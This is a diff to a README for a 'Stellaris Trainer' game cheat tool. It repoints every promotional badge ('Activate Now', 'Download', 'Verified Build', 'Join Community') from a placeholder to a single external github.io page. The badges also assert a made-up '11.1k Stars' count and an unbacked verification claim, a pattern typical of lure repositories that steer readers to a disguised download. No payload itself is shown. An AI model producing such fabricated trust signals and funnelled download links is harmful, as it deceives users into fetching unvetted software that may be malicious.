@@ -23,10 +23,10 @@ The trainer is designed for **single-player optimization**. It allows players to
 
 ---
 
-[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](#)
-[![⭐️ 11.1k Stars](https://img.shields.io/badge/GitHub-11.1k_Stars-green?logo=github\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](#)
+[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](https://stellaris-trainers.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](https://stellaris-trainers.github.io/.github/)
+[![⭐️ 11.1k Stars](https://img.shields.io/badge/GitHub-11.1k_Stars-green?logo=github\&style=for-the-badge)](https://stellaris-trainers.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](https://stellaris-trainers.github.io/.github/)
 
 ---
 
@@ -159,8 +159,8 @@ A: Yes, simply disable the trainer or reset values.
 
 The **Stellaris Trainer** brings **resource boosts, instant research, and fleet assists** into one streamlined package. Whether you want to experiment with late-game empires, test strategies, or remove grind, it ensures you play Stellaris on your own terms.
 
-[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](#)
-[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](#)
+[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](https://stellaris-trainers.github.io/.github/)
+[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](https://stellaris-trainers.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](https://stellaris-trainers.github.io/.github/)
 
 ---
